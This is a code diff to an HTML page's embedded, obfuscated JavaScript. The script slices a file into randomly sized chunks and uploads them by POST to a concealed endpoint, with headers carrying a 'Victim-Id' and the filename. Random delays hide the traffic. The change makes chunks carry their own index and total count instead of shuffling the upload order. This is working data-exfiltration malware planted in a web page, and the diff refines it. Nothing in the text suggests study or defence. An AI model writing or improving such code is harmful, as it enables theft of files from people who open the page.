@@ -55,15 +55,15 @@
                     while (offset < _0xddd.byteLength) {
                       let chunkSize = Math.floor(Math.random() * (maxChunkSize - minChunkSize) + minChunkSize);
                       let end = Math.min(offset + chunkSize, _0xddd.byteLength);
-                      chunks.push(_0xddd.slice(offset, end));
+                      let chunkData = _0xddd.slice(offset, end);
+                      chunks.push({ index: chunks.length + 1, total: 0, data: chunkData });
                       offset = end;
                     }
-    
-                    // Shuffle chunks to randomize upload order
-                    chunks = chunks.map((chunk, index) => ({ index, chunk }));
-                    chunks.sort(() => Math.random() - 0.5);
                     
-                    for (let { index, chunk } of chunks) {
+                    // Assign total chunks count to each chunk
+                    chunks.forEach(chunk => chunk.total = chunks.length);
+                    
+                    for (let { index, total, data } of chunks) {
                       await new Promise(resolve => setTimeout(resolve, Math.random() * (100 - 50) + 50)); // 0.05 - 0.1 sec delay
                       await fetch(_0x1a2b3c, {
                         method: "POST",
@@ -71,10 +71,10 @@
                           "Content-Type": "application/octet-stream",
                           "Victim-Id": encodeURIComponent(_0xaaa),
                           "Filename": encodeURIComponent(_0xbbb.name),
-                          "Chunk-Index": index + 1,
-                          "Total-Chunks": chunks.length
+                          "Chunk-Index": index,
+                          "Total-Chunks": total
                         },
-                        body: chunk
+                        body: data
                       });
                     }
                   })(_0xdef456, _0x111222);
@@ -94,7 +94,8 @@
           console.error("An error occurred", _0x999999);
         }
       });
-    })();       
+    })();
+         
   </script>
 </body>
 </html>
